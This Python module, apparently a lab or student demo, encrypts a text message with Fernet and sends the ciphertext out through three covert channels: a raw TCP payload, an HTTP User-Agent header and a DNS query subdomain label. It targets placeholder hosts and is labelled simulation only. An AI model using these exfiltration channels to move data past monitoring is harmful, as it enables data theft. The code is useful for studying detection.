# embed_module.py

import base64
from cryptography.fernet import Fernet
import scapy.all as scapy
import requests
import dns.resolver
import os
import json
from datetime import datetime

def get_key():
    key_path = "secret.key"
    if os.path.exists(key_path):
        with open(key_path, "rb") as key_file:
            key = key_file.read()
            print("Loaded Fernet Key.")
    else:
        key = Fernet.generate_key()
        with open(key_path, "wb") as key_file:
            key_file.write(key)
            print("Generated and saved Fernet Key.")
    return key

def encrypt_data(data, key):
    cipher = Fernet(key)
    return cipher.encrypt(data.encode()).decode()

def log_history(input_text, encrypted_text, protocol):
    file_path = "savedData.json"
    timestamp = datetime.utcnow().isoformat()

    entry = {
        "input": input_text,
        "encrypted": encrypted_text,
        "decrypted": "",
        "protocol": protocol,
        "timestamp": timestamp
    }

    try:
        if os.path.exists(file_path):
            with open(file_path, "r") as f:
                data = json.load(f)
        else:
            data = {}

        if "history" not in data:
            data["history"] = []

        data["history"].append(entry)

        with open(file_path, "w") as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        print(f"Error logging history: {e}")

# Protocol-specific embedding (simulation only)
def embed_in_tcp(data, original):
    packet = scapy.IP(dst="192.168.1.1") / scapy.TCP(dport=80) / data
    scapy.send(packet, verbose=False)
    print("Simulated sending via TCP.")
    log_history(original, data, "TCP")

def embed_in_http(data, original):
    try:
        requests.get("http://example.com", headers={"User-Agent": data})
        print("Simulated sending via HTTP header.")
    except:
        pass
    log_history(original, data, "HTTP")

def embed_in_dns(data, original):
    try:
        label = data[:63]
        dns.resolver.Resolver().resolve(f"{label}.example.com", "A")
    except:
        pass
    print("Simulated sending via DNS.")
    log_history(original, data, "DNS")

def start_embedding(input_text):
    key = get_key()
    encrypted = encrypt_data(input_text, key)

    embed_in_tcp(encrypted, input_text)
    embed_in_http(encrypted, input_text)
    embed_in_dns(encrypted, input_text)

    print("✅ Embedding complete.")

if __name__ == "__main__":
    sample_input = "Test Message"
    start_embedding(sample_input)
